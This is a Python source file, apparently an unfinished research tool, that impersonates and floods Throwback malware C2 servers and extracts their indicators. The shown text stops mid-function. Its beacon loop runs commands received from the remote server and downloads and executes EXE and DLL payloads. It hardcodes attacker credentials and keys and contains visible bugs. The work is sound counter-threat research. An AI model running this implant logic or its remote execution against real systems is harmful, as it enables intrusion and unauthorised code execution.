#!/usr/bin/env python
# -*- coding: latin-1 -*-
#█▀▀▀▀█▀▀▀▀▀██▀▀▀▀██▀▀▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀▀▓▒▀▀▀▀▀▀▀▀▀▀█▓▀ ▀▀▀██▀▀▀▀▀▀▀▀▀▓▓▀▀▀▀▀▀▀▀▀▌
#▌▄██▌ ▄▓██▄ ▀▄█▓▄▐ ▄▓█▓▓▀█ ▄▓██▀▓██▓▄ ▌▄█▓█▀███▓▄ ▌▄█▓█ ▀ ▄▓██▀▓██▓▄ ▄█▓█▀███▄■
#▌▀▓█▓▐▓██▓▓█ ▐▓█▓▌▐▓███▌■ ▒▓██▌ ▓██▓▌▐▓▒█▌▄ ▓██▓▌ ▐▓▒█▌▐ ▒▓██▌  ▓██▓▌▓▒█▌ ▓█▓▌
#▐▓▄▄▌░▓▓█▓▐▓▌ █▓▓▌░▓▓█▓▄▄ ▓▓██▓▄▄▓█▓▓▌░▓█▓ █ ▓█▓▓▌░▓█▓ ▒ ▓▓██▓▄▄▓█▓▓▌▓█▓ ░ ▓█▓▓
#▐▓▓█▌▓▓▓█▌ █▓▐██▓▌▐▓▒▓▌ ▄ ▐░▓█▌▄ ▀▀▀ ▐▓▓▓ ▐▌ ▀▀▀  ▐▓▓▓▄▄ ▐░▓█▌ ▄ ▀▀▀ ▓▓▓ ░ ██▓▓
#▐▓▓▓█▐▓▒██ ██▓▓▓▌▐▓▓██  █▌▐▓▓▒▌▐ ███░▌▐▓▓▒▌▐ ███░▌ ▐▓▓▒▌ ▐▓▓▒▌▀ ███░▌▓▓▒▌ ███░
# ▒▓▓█▌▒▓▓█▌ ▐▓█▒▒  ▒▓██▌▐█ ▒▓▓█ ▐█▓▒▒ ▒▒▓█  ▐█▓▒▒  ▒▒▓█ ▓▌▒▓▓█ ▐█▓▒▒ ▒▒▓█ ▐█▓▒▌
#▌ ▒▒░▀ ▓▒▓▀  ▀░▒▓ ▐▌ ▓▓▓▀ █ █▒▓▀▀░█▓ ▄▌ ▒▒▓▀▀░█▓ ▄▌ ▒▒▓▀▀ █▒▓▀▀░█▓ ▒▒▓▀▀░█▀
#█▄ ▀ ▄▄ ▀▄▄▀■ ▀ ▀▓█▄ ▀ ▄█▓█▄ ▀ ▓▄▄▄▄▄█▀ ▄▀ ▄▄▄▄▄▄█▓▄ ▀ ▄▄█▓▄▀ ▄▓▄█▄▀ ▄▄▄█▌
#
# Copyright (C) 2015 Jonathan Racicot
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <http:#www.gnu.org/licenses/>.
# </copyright>
# <author>Jonathan Racicot</author>
# <email>infectedpacket@gmail.com</email>
# <date>2015-03-26</date>
# <url>https://github.com/infectedpacket</url>
# <summary>Allows to base64 encode strings and file contents 
# using a custom alphabet and padding character.</summary>
#//////////////////////////////////////////////////////////
#
#//////////////////////////////////////////////////////////
# Program Information
#
PROGRAM_NAME = "Trollback"
PROGRAM_DESC = "Program to perform counter-operations against a Throwback server."
PROGRAM_USAGE = "%(prog)s"

__version_info__ = ('0','1','2b')
__version__ = '.'.join(__version_info__)

#//////////////////////////////////////////////////////////
# Imports Statements
#
import os
import re
import sys
import time
import base64
import random
import signal
import shutil
import threading
import string
import urllib
import httplib
import tempfile
import argparse
import platform
import traceback
import subprocess
from urlparse import urlparse
from time import gmtime, strftime


#//////////////////////////////////////////////////////////
# Startup
PLATFORM = ""
if (platform.system() == "Windows"):
	PLATFORM = "Windows"
else:
	PLATFORM = "Linux"

#//////////////////////////////////////////////////////////
# Constants and global variables
#
PRIV_USER = "0"
PRIV_ADMIN = "1"

KEY_TARGET	= "tgt"
KEY_SVC_NAME	= "svc_name"
KEY_SVC_DESC	= "svc_desc"
KEY_AUTH_KEY	= "enc"
KEY_HOSTNAME	= "hn"
KEY_TBVERS	= "vn"
KEY_DATA	= "pd"
KEY_IPADDR	= "num"
KEY_CCODE	= "cc"
KEY_XOR_KEY	= "xk"
KEY_CIPHER_KEY	= "ck"
KEY_PRIV	= "pp"
KEY_UASTR	= "User-Agent"
KEY_PRAGMA	= "Pragma"
KEY_RESP_KEY	= "pk"
KEY_RESP_DATA	= "res"
KEY_MACHINEID	= "id"
KEY_CALLBACK	= "cb"
KEY_CB_DELAY	= "delay"
KEY_LOG		= "log"
KEY_DOWN_DIR	= "dd"
KEY_BACK_DIR	= "bd"
KEY_NOEXEC	= "noexec"
KEY_PROXY_USE	= "pp"
KEY_PROXY_NET	= "proxy"

TARGET_DELIM = ";"
COMMAND_DELIM = "&"

RANDOM_VAL = "rnd"
DEFAULT_CP_USER = "root"
DEFAULT_CP_PASS = "ThrowbackPwnage!@#"
DEFAULT_HOSTNAME = "Home"
DEFAULT_TB_VERS = "2.50"
DEFAULT_UA = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)"
DEFAULT_CRYPTO_KEY = "ZAQwsxcde321"
DEFAULT_AUTH_KEY = "123spec!alk3y456"
DEFAULT_STR_XOR_KEY = "Q"
DEFAULT_LOG_FILE = "events.log"
DEFAULT_ZIP_PASS = "infect3d"

NO_CACHE = "no-cache"


#TODO:
# Include constants for TB errors
TB_SUCCESS	= "0"
TB_FAIL		= "3"
TB_FAIL_UPGRADE	= "9"
TB_ACK		= "10"

IDX_CMD_CMD	= 0
IDX_CMD_RESP	= 1
IDX_CMD_PROG	= 2 
IDX_CMD_ARGS	= 3
IDX_CMD_RUN	= 4

#TODO:
# Include constants for TB commands
CMD_NO_ACTION	= "0"
CMD_EXEC_CMD	= "1"
CMD_DOWN_EXEC	= "2"
CMD_DOWNLOAD	= "3"
CMD_DOWN_EX_DLL	= "4"
CMD_UPDATE_CB	= "5"
CMD_UNINSTALL	= "7"

CMD_MARKER 	= ".*<hidden {:s} (.*)>.*"

PROG_7Z		= "7z.exe"
if (PLATFORM == "Linux"):
	PROG_7Z = "7z"

PROG_STR	= "strings.exe"
if (PLATFORM == "Linux"):
	PROG_STR = "strings"

PROG_RUNDLL	= "rundll32.exe"

FUNC_METASPT	= "@DllMain12"

TIMER_RACE = 0.85


URL_PATH_CP = "cp/login.php"
URL_PATH_SQL = "throwbackcp.sql"

TbStringIndicators = ["Throwback", "INJECTION FAILED"]
TbFileExtensions = ["exe", "dll"]

IsBeaconing = False
RunningThreads = []

verbose = False

#
# Filters replaces keywords in the output of the
# execution of a program.
# Ie. The first entry replaces "trollback" with "setup"
#
Filters = {
	"trollback"	:	"setup"
}

#
#//////////////////////////////////////////////////////////////////////////////	
# Argument Parser Declaration
#
usage = PROGRAM_USAGE
parser = argparse.ArgumentParser(
	usage=usage, 
	prog=PROGRAM_NAME, 
	version="%(prog)s "+__version__, 
	description=PROGRAM_DESC)
c2_options = parser.add_argument_group("C2 Server Options", 
	"Options to communicate with C2 server")	
c2_options.add_argument("-t", "--target", 
	dest="target_uri",
	metavar="url", 
	help="URL of the C2 server to target.")
c2_options.add_argument("-k", "--crypto-key", 
	dest="crypto_key", 
	default=DEFAULT_CRYPTO_KEY,
	help="RC4 crypto key used by the server.")
c2_options.add_argument("-a", "--post-auth", 
	dest="postauth_key", 
	default=DEFAULT_AUTH_KEY,
	help="POST authentification key for requests to the server.")	
c2_options.add_argument("-cc", "--command-code", 
	dest="command_code", 
	default="stup1fy",
	help="Command code used by server.")
c2_options.add_argument("-rk", "--response-key", 
	dest="response_key", 
	help="Response key to use when reply to a command.")
c2_options.add_argument("-sk", "--strings-key", 
	dest="strings_key",
	default=DEFAULT_STR_XOR_KEY, 
	help="XOR key used to unobfuscate strings in implant.")
action_options = parser.add_argument_group("Operations", 
	"Operations/Counter-Ops available.")
action_options.add_argument("-d", "--decoys",
	dest="action_flood",
	metavar="nb_hosts",
	type=int,
	help="Nb. of fake hosts to authentify with the C2 server")
action_options.add_argument("-b", "--beacon",
	dest="action_beacon",
	type=int,
	metavar="milliseconds",
	help="Sends a beacon to the specified C2 server.")
action_options.add_argument("-s", "--scan",
	dest="action_scan",
	metavar="file | directory",
	help="File or directory to scan for Throwback implant.")
action_options.add_argument("-f", "--find",
	dest="action_search",
	metavar="file | directory",
	nargs="+",
	help="Searches for files containing keywords in given directory.")
action_options.add_argument("-i", "--indicators",
	dest="action_ind",
	action="store_true",
	help="Extract indicators from scanned files.")
action_options.add_argument("-p", "--probe",
	dest="action_probe",
	action="store_true",
	help="Probe Throwback C2 servers for information.")
action_options.add_argument("-l", "--log",
	dest="event_log",
	default=DEFAULT_LOG_FILE,
	help="Specifies a file to keep a log of events.")
action_options.add_argument("--noexec",
	dest="no_execute",
	action="store_true",
	help="Prevents execution of files uploaded by adversary.")
io_options = parser.add_argument_group("File I/O Options", 
	"File management options")
io_options.add_argument("-dd", "--download",
	dest="down_dir",
	default=os.getcwd(),
	help="Destination directory for downloaded file")
io_options.add_argument("-bd", "--backup",
	dest="back_dir",
	help="Backup directory for files downloaded.")
io_options.add_argument("-vv", "--verbose",
	dest="verbose",
	action="store_true",
	help="Shows lots of strings and characters...")
host_options = parser.add_argument_group("Host", 
	"Information about the target host.")
host_options.add_argument("-hn", "--hostname",
	dest="hostname",
	metavar="Hostname",
	help="Name of the host.")
host_options.add_argument("-id", "--guid",
	dest="machine_id",
	metavar="Machine ID",
	help="Guid of the host.")
host_options.add_argument("-ip",
	dest="host_ip",
	metavar="IPv4 Address",
	help="IPv4 address of the local machine.")
conn_options = parser.add_argument_group("Connection Options", 
	"Options to connect")
conn_options.add_argument("-pp", "--proxy",
	dest="proxy",
	metavar="host:port",
	default="",
	help="Proxy to send the requests, if any.")

#//////////////////////////////////////////////////////////////////////////////	
# Code
#//////////////////////////////////////////////////////////////////////////////	
def signal_handler(signal, frame):
	print_warning('Ctrl-C pressed. Terminating...')
	global IsBeaconing
	global RunningThreads
	IsBeaconing = False
	for t in RunningThreads:
		print_info("Terminating beacon to '{:s}'...".format(t.name))
		t.join()

	sys.exit(0)

def rand_string(_minsize=4, 
	_maxsize=8, 
	_charset=string.ascii_uppercase + string.ascii_lowercase + string.digits):
	"""
	Generates a random string of variable length based on specified charset.

	@param _minsize Minimum size of the string
	@param _maxsize Maximum size of the string
	@param _charset Charset to use for generating the string
	@return A random string.
	"""
	r_size = random.randint(_minsize, _maxsize)
	r_str = ''.join(random.SystemRandom().choice(_charset) for _ in range(r_size))
	return r_str

def rand_int(_min, _max):
	"""
	Generates a random integer within the provided boundaries.
	
	@param _min Minimum boundary
	@param _max Maximum boundary
	@return A random integer
	"""
	return random.randint(_min, _max)
	
def rand_ip4addr(_min=10, _max=192):
	"""
	Generates a random IPv4 address.

	@param _min Minimum value of each byte
	@param _max Maximum value of each byte
	@return A string representation of an IPv4 address
	"""
	r_str = '.'.join("{:d}".format(rand_int(_min, _max)) for _ in range(4))
	return r_str


def generate_host(_machineid = "", 
		_ipaddr = [],
		_hostname="", 
		_tbvers=DEFAULT_TB_VERS, 
		_priv=PRIV_USER):
	"""
	Generates information about the current host to send back to the c2 server.
	Parameters not provided are randomized or assigned a default value.

	@param _machineid The guid of the machine. On Windows machine, used the value
			  of the HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid
	@param _ipaddr List of for bytes composing the IP address. Randomized bytes not
			provided.
	@param _hostname Name of the host that will be shown in the control panel
	@param _tbvers Version of the throwback implant reporting
	@param _priv Privilege level of the implant.
	@return Dictionary containing values of the host.
	"""		
	host = generate_random_host()
	if (len(_hostname) > 0):
		host[KEY_HOSTNAME] = _hostname
	if (len(_machineid) > 0):
		host[KEY_MACHINEID] = _machineid
	if (len(_ipaddr) < 4):
		ipaddr = _ipaddr
		while (len(_ipaddr) < 4):
			ipaddr.append("{:d}".format(random.randint(10, 192)))
		host[KEY_IPADDR] = '.'.join(ipaddr)
	host[KEY_TBVERS] = _tbvers
	host[KEY_PRIV] = _priv
	
	return host
	
def generate_random_host():
	"""
	Generates random information about the host to send back to the 
	throwback control panel.
	@return Dictionary containing values of the host.
	"""
	host = {}
	host[KEY_HOSTNAME] = rand_string()
	host[KEY_MACHINEID] = rand_string(8, 16, string.ascii_uppercase + string.digits)
	host[KEY_TBVERS] = DEFAULT_TB_VERS	
	host[KEY_IPADDR] = rand_ip4addr()
	host[KEY_PRIV] = rand_string(1,1, "01")
	return host

def b64_encode(_data):
	"""
	Encodes a string into a base 64 string.
	@param _data String to encode
	@return Base64-encoded string.
	"""
	return base64.b64encode(_data)

def b64_decode(_data):
	"""
	Decodes a base64-encoded string into a regular string.
	@param _data String to decode
	@return Base64-decoded string.
	"""
	return base64.b64decode(_data)

def rc4_crypt(key, data):
	"""
	Encrypts/decrypts a list of bytes using the RC4 cipher.

	@param key Cipher key to use for encryption/decryption
	@param data Data to encrypt/decrypt
	@return String representing cipher/plain text.
	"""
	x = 0
	box = range(256)
	for i in range(256):
		x = (x + box[i] + ord(key[i % len(key)])) % 256
		box[i], box[x] = box[x], box[i]
	x = 0
	y = 0
	out = []
	for char in data:
		x = (x + 1) % 256
		y = (y + box[x]) % 256
		box[x], box[y] = box[y], box[x]
		out.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256]))
    
	return ''.join(out)

def xor_crypt(key, data):
	"""
	Xor encrypts/decrypts a string using the provided key.

	@param key Encryption/Decryption key
	@param data Plain/cipher text
	@return Cipher/plain text version of provided data.
	"""
	str = ""
	for i in range(0, len(data)):
		k = ord(key[i % len(key)])
		b = ord(data[i])
		str += chr(k ^ b)
	return str

def log(_file, _event):
	cur_time= strftime("%Y-%m-%d %H:%M:%S", gmtime())

	if not os.path.isfile(_file):
		f = open(_file, "w+")
		f.close()

	with open(_file, "a+") as f:
		f.write("[{:s}]: {:s}.\n".format(cur_time,_event))		
	
def scan_dir(_dir, _filext=TbFileExtensions, _keywords=TbStringIndicators):
	"""
	Recursively scans a directory for 
	"""
	tb_files = []
	for root, dirs, files in os.walk(_dir, topdown=False):
		for fname in files:
			if (fname[-3:] in _filext):
				file_to_scan = os.path.join(root, fname)
				print_debug("Scanning '{:s}'...".format(file_to_scan))
				matched = scan_file(file_to_scan, _keywords)
				if (len(matched) > 0):
					print_debug("File matched 1 or more keywords: {:s}".format(file_to_scan))
					tb_files.append(file_to_scan)
		for dname in dirs:
			dir_to_scan = os.path.join(root, dname)
			tb_files_found = scan_dir(dir_to_scan, _filext, _keywords)
			tb_files += tb_files_found
	return tb_files
				

def scan_file_for_tb(_file):
	"""
	Scan the given files for indicators of the throwback implant.

	@param _file Absolute path to file to scan
	@return True if the file is suspected to be a Throwback implant, False 
		otherwise.
	"""
	is_tb = False
	found_str = scan_file(_file, TbStringIndicators)
	is_tb = (len(found_str) > 0)
	return is_tb


def scan_file(_file, _keywords):
	"""
	Searches a file for keywords. Keywords can be regular expressions.
	
	@param _file The file to scan
	@param _keywords List of keywords to search.
	@return A list of matched strings
	"""
	matched = []
	strings = extract_strings(_file)
	for str in strings:
		for k in _keywords:
			if (re.search(k, str)):
				matched.append(str)		
	return matched 
	
def extract_strings(_file, _len=6):
	"""
	Extracts strings of given length from the specified file.

	Note: this function is based on usage of the "strings" program
	in the current directory or in the PATH environment variable.

	@param _file Absolute path to the file.
	@param _len Minimum length of strings.
	@return List of strings extracted.
	"""
	str = []
	if (len(_file) > 0):
		output = subprocess.check_output([PROG_STR, '-n', "{:d}".format(_len), _file])
		str = filter(None, output.split("\n"))
	return str

def extract_url(_fh, _fpos, _xkey):
	_fh.seek(_fpos)
	c_url = []
	b = _fh.read(4)
	while b[0] != '\xFF':
		c_url.append(b[0])
		b = _fh.read(4)
	p_url1 = xor_crypt(_xkey, c_url)
	return p_url1

def extract_bytes_with_term(_fh, _fpos, _readsize, _term):
	"""
	Reads a specific number of bytes from the given position until a given value
	is read.

	Example:
	f = open("crap.exe", "rb")
	extract_bytes_with_term(f, 0x4000, 4, 0)

	The example above will read 4 bytes in the file "crap.exe" at position 0x4000
	until it reads 0x0.

	@param _fh File handle
	@param _fpos Starting position
	@param _readsize Number of bytes to read at once
	@param _term Terminator byte
	@return A list of byte read.
	"""
	_fh.seek(_fpos)
	b_read = []
	b = _fh.read(_readsize)
	while (ord(b[0]) != _term):
		b_read.append(b[0])
		b = _fh.read(_readsize)
	return b_read

def extract_c2data(_file, _xkey):
	"""
	Extract indicators from unpacked Throwback implant file.

	@param _file Throwback implant file
	@param _xkey XOR key to decrypt strings.
	@return Dictionary of indicators extracted.
	"""
	c2data = {}
	f = open(_file, 'rb')

	#
	# Define positions of indicators in binary file.
	#
	pos = {}
	pos[KEY_UASTR] = 168288
	pos[KEY_CIPHER_KEY] = 169816
	pos[KEY_AUTH_KEY] = 170800
	pos[KEY_SVC_NAME] = 193680
	pos[KEY_SVC_DESC] = 193872
	pos[KEY_CCODE] = 196304

	#
	# Read user-agent string from files
	#
	b_ua = extract_bytes_with_term(f, pos[KEY_UASTR], 2, 0)
	ua = str(bytearray(b_ua))

	#
	# Read RC4 crypto key
	#
	b_ck = extract_bytes_with_term(f, pos[KEY_CIPHER_KEY], 1, 0)
	crypto_key = str(bytearray(b_ck))

	r = 0
	f.seek(pos[KEY_AUTH_KEY])
	auth_code = []
	b = f.read(4)
	while r < 64:
		auth_code += b[0]
		b = f.read(4)
		r += 4
	auth_code = xor_crypt(_xkey, auth_code)

	#
	# Read service name
	#
	b_svcname = extract_bytes_with_term(f, pos[KEY_SVC_NAME], 4, 0)
	svc_name = xor_crypt(_xkey, str(bytearray(b_svcname)))

	#
	# Read service description
	#
	b_svcdesc = extract_bytes_with_term(f, pos[KEY_SVC_NAME], 4, 0)
	svc_desc = xor_crypt(_xkey, str(bytearray(b_svcdesc)))

	#
	# Extract URLs
	#
	urls = []
	first_url = 194384
	url_len = 60
	nb_urls = 8 
	for i in range(0, nb_urls):
		urls.append(extract_url(f, first_url+(i*url_len*4), _xkey))

	#
	# Extract command code
	#
	b_cc = extract_bytes_with_term(f, pos[KEY_CCODE], 4, 0)
	command_code = xor_crypt(_xkey, str(bytearray(b_cc)))

	c2data[KEY_UASTR] = ua
	c2data[KEY_CIPHER_KEY] = crypto_key
	c2data[KEY_CCODE] = command_code
	c2data[KEY_AUTH_KEY] = auth_code
	c2data[KEY_SVC_NAME] = svc_name
	c2data[KEY_SVC_DESC] = svc_desc

	for i in range(0, len(urls)):
		c2data["{:s}_{:d}".format(KEY_TARGET, i)] = urls[i]

	f.close()
	return c2data

def filter_response(_resp):
	"""
	Replaces keywords in the output of the command sent back to the
	C2 server.

	@param _resp Output of the command.
	@return Output with filtered keywords.
	"""
	filtered = _resp
	global Filters
	if (len(_resp) > 0):
		for (keyword, replacement) in Filters.iteritems():
			filtered = filtered.replace(keyword, replacement)
	return filtered	

def select_c2(_targets, _headers={}, _max=10):
	is_connected = False
	target = ""
	idx = rand_int(0, len(_targets)-1)
	resp_code = 0
	retries = 0
	idx = 0
	while (resp_code != 200 and retries < _max):
		uri = _targets[idx]
		print_info("Trying to connect to '{:s}'...".format(uri))
		c2_connection = None;
		url = urlparse(uri)
		if (url.scheme == "https"):
			c2_connection = httplib.HTTPSConnection(url.netloc)
		else:
			c2_connection = httplib.HTTPConnection(url.netloc)
		try:
			c2_connection.request("GET", url.path, headers=_headers)
			response = c2_connection.getresponse()
			resp_code = response.status
		except:
			print_error("Failed to connect to '{:s}'.".format(uri))
		idx += 1
		retries += 1
		if (resp_code == 200):
			print_success("Connected to '{:s}'.".format(uri))
			target = uri
		else:
			time.sleep(15)

	return target

def start_beaconing(_targets, _session, _headers={}):
	"""

	"""
	global IsBeaconing
	
	target = ""
	_session[KEY_CALLBACK] = "1"
	delay = _session[KEY_CB_DELAY]/1000
	
	while (IsBeaconing):
		resp = ""

		if ((len(target) <= 0 or not webpage_exists(target, "/index.php was not found"))):
			target = ""
			retry_delay = 180
			while (len(target) <= 0):
				target = select_c2(_targets, _headers=_headers)
				if (len(target) <= 0):
					time.sleep(retry_delay)
				else:					
					log_success(_session[KEY_LOG], "Beaconing to {:s} every {:d} second(s).".format(target, int(delay)))
					print_info("Waiting for new command...")
					print_info("Press 'Ctrl-Break' on Windows or 'Ctrl-Shift-\\' on Linux to terminate.")

		if (len(target) > 0):
			cmd_str = send_beacon(target, _session, _headers)
			if KEY_RESP_KEY in _session: del _session[KEY_RESP_KEY]
			if KEY_RESP_DATA in _session: del _session[KEY_RESP_DATA]
			if (len(cmd_str) > 0):
				cmd = filter(None, cmd_str.split(COMMAND_DELIM))
				if (cmd[IDX_CMD_CMD] != CMD_NO_ACTION):
					_session[KEY_RESP_KEY] = cmd[IDX_CMD_RESP] 
					resp = process_cmd(cmd, target, _session)
					resp = filter_response(resp)
					log_info(_session[KEY_LOG], 
						"Sending reply to command {:s} from '{:s}'.".format(cmd[IDX_CMD_CMD], target))
				else:
					resp = TB_ACK

				_session[KEY_RESP_DATA] = b64_encode(resp)
				send_beacon(target, _session, _headers)
						
				
		delay = _session[KEY_CB_DELAY]
		time.sleep(delay)
		
def process_cmd(cmd, _target, _session):
	"""

	Format of command sent by c2 server;
	  cmd[1] : Response key; needed to link the response to the command sent
	  cmd[2] : Arguments to the command
	  cmd[3] : RunAs option
	  cmd[4] : TBD

	@param cmd List of parameters received from C2 server.
	@param _target URL of the C2 server.
	@param _session Parameters of the session.
	@return Result from processing the command received.
	"""
	resp = ""
	if (cmd[IDX_CMD_CMD] != CMD_NO_ACTION):
		for i in range(1, len(cmd)):
			print_success("\t> {:s}".format(cmd[i]))
			log_success(_session[KEY_LOG], 
				"Received new command from {:s}: {:s} ({:s}).".format(_target, 
					cmd[IDX_CMD_CMD], 
					command_desc(cmd[IDX_CMD_CMD])))

			# Execute command
			if (cmd[IDX_CMD_CMD] == CMD_EXEC_CMD):
				prog = cmd[IDX_CMD_PROG]
				args = []
				if (len(cmd) > 3):
					args = filter(None,cmd[IDX_CMD_ARGS].split(" "))

				log_info(_session[KEY_LOG], "Executing command '{:s} {:s}'...".format(prog, ' '.join(args)))
				try:
					resp = subprocess.check_output([cmd[IDX_CMD_PROG]] + args)
				except Exception as e:
					log_error(_session[KEY_LOG], "Failed to execute '{:s} {:s}':".format(prog, ' '.join(args)))
					log_error(e.message)
					resp = TB_FAIL
			# Download and execute EXE file
			elif (cmd[IDX_CMD_CMD] == CMD_DOWN_EXEC):
				log_info(_session[KEY_LOG], "Download file from '{:s}' with argument(s) '{:s}'.".format(
					cmd[IDX_CMD_CMD], cmd[IDX_CMD_ARGS]))
				try:
					url = urlparse(cmd[IDX_CMD_CMD])
					local_filename = url.path.rsplit("/")[-1]
					local_file = os.path.join(_session[KEY_DOWN_DIR], local_filename)
					backup_file = os.path.join(_session[KEY_BACK_DIR], rand_string(8,12))
					download_file(cmd[IDX_CMD_CMD], local_file, backup_file, True)

					if (os.path.isfile(local_file) and not _session[NOEXEC]):
						print_info("Executing '{:s}'.".format(local_file))
						args = []
						if (len(cmd) > 3):
							args = filter(None,cmd[IDX_CMD_ARGS].split(" "))
							resp = subprocess.check_output([cmd[IDX_CMD_PROG]] + args)
						else:
							resp = TB_FAIL
				except Exception as e:
					log_error(_session[KEY_LOG], "Failed to download file at '{:s}'.".format(
						cmd[IDX_CMD_PROG]))
					log_error(_session[KEY_LOG], e.message)
					resp = TB_FAIL
	
			# Download file
			elif (cmd[IDX_CMD_CMD] == CMD_DOWNLOAD):
				log_info(_session[KEY_LOG], "Download file from '{:s}' with argument(s) '{:s}'.".format(
					cmd[IDX_CMD_PROG], cmd[IDX_CMD_ARGS]))
				try:
					url = urlparse(cmd[IDX_CMD_PROG])
					local_filename = url.path.rsplit("/")[-1]
					local_file = os.path.join(_session[KEY_DOWN_DIR], local_filename)
					backup_file = os.path.join(_session[KEY_BACK_DIR], rand_string(8,12))
					download_file(cmd[IDX_CMD_PROG], local_file, backup_file, True)
					resp = TB_SUCCESS
				except Exception as e:
					log_error(_session[KEY_LOG], "Failed to download file at '{:s}'.".format(
						cmd[IDX_CMD_PROG]))
					log_error(_session[KEY_LOG], e.message)
					resp = TB_FAIL
			# Download and execute DLL
			elif (cmd[IDX_CMD_CMD] == CMD_DOWN_EX_DLL):
				log_info(_session[KEY_LOG], "Download file from '{:s}' with argument(s) '{:s}'.".format(
					cmd[IDX_CMD_PROG], cmd[IDX_CMD_ARGS]))
				try:
					url = urlparse(cmd[IDX_CMD_PROG])
					local_filename = url.path.rsplit("/")[-1]
					local_file = os.path.join(_session[KEY_DOWN_DIR], local_filename)
					backup_file = os.path.join(_session[KEY_BACK_DIR], rand_string(8,12))
					download_file(cmd[IDX_CMD_PROG], local_file, backup_file, True)
					log(_session[KEY_LOG], "File '{:s}' backed up to '{:s}'.".format(url, backup_file))
					if (os.path.isfile(local_file) and not _session[NOEXEC]):
						log_info(_session[KEY_LOG], "Executing '{:s}'.".format(local_file))
						args = []
						if (len(cmd) > 3):
							#TODO: Testing on Windows Machine with meterpreter
							args = filter(None,cmd[IDX_CMD_ARGS].split(" "))
							args.append(FUNC_METASPT)
							resp = subprocess.check_output([PROG_RUNDLL, "{:s},".format(local_file)] + args)
							print_debug(resp)
						else:
							resp = TB_FAIL
				except Exception as e:
					log_error(_session[KEY_LOG], 
						"Failed to download and execute file at '{:s}'.".format(
							cmd[IDX_CMD_PROG]))
					log_error(_session[KEY_LOG], e.message)
					resp = TB_FAIL

			# Update callback delay
			elif (cmd[IDX_CMD_CMD] == CMD_UPDATE_CB and len(cmd[IDX_CMD_PROG]) > 0):
				new_delay_min = int(cmd[IDX_CMD_PROG], 10)
				if (KEY_CALLBACK in _session):
					del _session[KEY_CALLBACK]
				if (new_delay_min == 0):
					new_delay_min = 1 
				delay = new_delay_min*60
				# To enable the race between the legitimate Tb implant and
				# Trollback, we trim a few seconds of the new CB time 
				delay = delay * TIMER_RACE
				log_success(_session[KEY_LOG], "Callback delay updated to {:2f} second(s).".format(delay))
				_session[KEY_CB_DELAY] = delay
				resp = TB_SUCCESS
			# Upgrade implant
			elif (cmd[IDX_CMD_CMD] == "6"):
				#TODO: 
				log_info(_session[KEY_LOG], "Upgrading Throwback client.")
				# Download file
				log_info(_session[KEY_LOG], "Download file from '{:s}' with argument(s) '{:s}'.".format(
					cmd[IDX_CMD_PROG], cmd[IDX_CMD_ARGS]))
				try:
					url = urlparse(cmd[IDX_CMD_PROG])
					local_filename = url.path.rsplit("/")[-1]
					local_file = os.path.join(_session[KEY_DOWN_DIR], local_filename)
					backup_file = os.path.join(_session[KEY_BACK_DIR], rand_string(8,12))
					download_file(cmd[IDX_CMD_PROG], local_file, backup_file, True)
					log_success(_session[KEY_LOG], "File '{:s}' backed up to '{:s}'.".format(url, backup_file))
					if (os.path.isfile(local_file)):
						print_debug("Extracting new indicators from '{:s}'.".format(local_file))
					else:
						resp = TB_FAIL_UPGRADE
				except Exception as e:
					log_error(_session[KEY_LOG], 
						"Failed to upgrade implant using file at '{:s}'.".format(
							cmd[IDX_CMD_PROG]))
					log_error(_session[KEY_LOG], e.message)
					resp = TB_FAIL_UPGRADE
				# Extract indicators
				# Embed indicators into Trollback
				# Return "1" or "3"
			# Uninstall			
			elif (cmd[IDX_CMD_CMD] == "7"):
				#TODO
				#Clean up/tidy up
				log_warning(_session[KEY_LOG], "Adversary is attempting to uninstall implant.")
				#
				# Change behaviour of the uninstall command here
				resp = "1"
				#
				if (resp == "1"):
					log_info(_session[KEY_LOG], "Returning false success response to C2 server.")
				else:
					# Causes the intercept op to stop
					global IsBeaconing
					IsBeaconing = False

	return resp

def send_beacon(_target, _session, _headers=[]):
	"""

	@param _target URL of the C2 server to beacon to.
	@param _session Parameters of the session.
	@param _headers Headers to send with the request.
	@return The command received from the server, if any.
	"""
	uri = _target.lower().strip()
	#print_info("Connecting to {:s}...".format(uri))

	post_params = {}
	if KEY_RESP_KEY in _session:
		post_params[KEY_RESP_KEY] = _session[KEY_RESP_KEY]
	if KEY_RESP_DATA in _session:
		post_params[KEY_RESP_DATA] = _session[KEY_RESP_DATA]
	post_params[KEY_HOSTNAME] = _session[KEY_HOSTNAME]
	post_params[KEY_IPADDR] = _session[KEY_IPADDR]
	post_params[KEY_TBVERS] = _session[KEY_TBVERS]
	post_params[KEY_MACHINEID] = _session[KEY_MACHINEID]
	post_params[KEY_CIPHER_KEY] = _session[KEY_CIPHER_KEY]
	post_params[KEY_AUTH_KEY] = _session[KEY_AUTH_KEY]
	post_params[KEY_PRIV] = _session[KEY_PRIV]
	if (KEY_CALLBACK in _session):
		post_params[KEY_CALLBACK] = _session[KEY_CALLBACK]
	

	qs = create_querystring(post_params)
	print_debug("Data sent to '{:s}':".format(uri))
	print_debug("\tHostname  : {:s}".format(post_params[KEY_HOSTNAME]))
	print_debug("\tIp Address: {:s}".format(post_params[KEY_IPADDR]))
	print_debug("\tAuth. Key : {:s}".format(post_params[KEY_AUTH_KEY]))
	print_debug("\tCipher Key: {:s}".format(post_params[KEY_CIPHER_KEY]))
	if KEY_RESP_KEY in post_params:
		print_debug("\tResp. Key : {:s}".format(post_params[KEY_RESP_KEY]))
		print_debug("\tResp. Data: {:s}".format(post_params[KEY_RESP_DATA]))
	print_debug("Query:\n\t{:s}".format(qs))
	
	cipher_qs = rc4_crypt(_session[KEY_CIPHER_KEY], qs)
	encoded_qs = b64_encode(cipher_qs)
	final_qs = encoded_qs.replace("+", "~")
	post_data = {}
